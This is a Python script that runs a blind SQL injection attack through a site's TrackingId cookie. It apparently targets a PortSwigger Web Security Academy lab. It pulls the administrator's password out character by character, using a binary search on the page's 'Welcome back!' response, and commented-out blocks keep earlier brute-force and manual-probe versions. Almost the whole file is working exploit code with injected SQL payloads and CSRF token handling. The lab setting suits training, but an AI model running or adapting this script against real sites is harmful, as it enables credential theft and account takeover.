import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, digits

arr_digits_letters = list(digits + ascii_lowercase)


def send_request(operator: str, simbol: str, n_sim_of_pass) -> bool:
        with requests.Session() as s:
            r = s.get(url,headers=headers,verify=False)
            original_cookies = s.cookies.get("TrackingId")
            modified_cookies = original_cookies + f"'  AND (SELECT SUBSTRING(password,{n_sim_of_pass},1) FROM users WHERE username='administrator'){operator}'{simbol}"
            cookies = dict(TrackingId=modified_cookies)
            soup = BeautifulSoup(r.text, 'html.parser')

            csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
            login_data['csrf'] = csrfToken
            
            r = s.post(url, data=login_data, headers=headers, cookies=cookies)
            soup = BeautifulSoup(r.content, 'html.parser')
            html_unswer = soup.prettify()
            # print(html_unswer)
            if "Welcome back!" in html_unswer:
                return True
            return False                


def binary_search(arr: list, n: int):
    low = 0
    high = len(arr) - 1
    while low <= high:
        middle = (low + high) // 2
        if send_request("=", arr[middle], n):
            return arr[middle]
        if send_request("<", arr[middle], n):
            high = middle - 1
        else:
            low = middle + 1
    
    return None


headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/80.0.3987.160 Chrome/80.0.3987.163 Safari/537.36'
 }

login_data = {
             'username' : 'administrator',
             'password' : '123',
  }

url = 'https://ac831fb01e241bd4c1951c8e00070093.web-security-academy.net/login'


if __name__ == "__main__":
    password_admin = ""
    i = 0
    n = 1
    while True:
        unswer = binary_search(arr_digits_letters, n)
        if unswer is not None:
            password_admin += unswer
            n += 1
        else:
            break
    
    print(f"\n\n\n\npassword: ({password_admin})")
        














    # password_admin = ""
    # i = 0
    # n = 1
    # while True:
    #     try:
    #         unswer = send_request("=", arr_digits_letters[i], n)
    #         print(password_admin)
    #         print(f"i: {i}")
    #     except IndexError:
    #             print(f"password: {password_admin}")
    #             break

    #     if unswer:
    #         password_admin += arr_digits_letters[i]
    #         n += 1
    #         i = 0
    #         continue
    #     i += 1
























# with requests.Session() as s:
#     r = s.get(url,headers=headers,verify=False)
#     original_cookies = s.cookies.get("TrackingId")
#     modified_cookies = original_cookies + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm -- ."
#     # modified_cookies = original_cookies + "' AND 1=2 -- ."
#     # s.cookies.set("TrackingId", modified_cookies)
#     cookies = dict(TrackingId=modified_cookies)
#     soup = BeautifulSoup(r.text, 'html.parser')

#     csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
#     login_data['csrf'] = csrfToken
#     r = s.post(url, data=login_data, headers=headers, cookies=cookies)
#     # print(r.content)
#     soup = BeautifulSoup(r.content, 'html.parser')
#     html_unser = soup.prettify()
#     print(html_unser)
#     if "Welcome back!" in html_unser:
#         print(True)
#     else:
#         print(False)
#     print(s.cookies)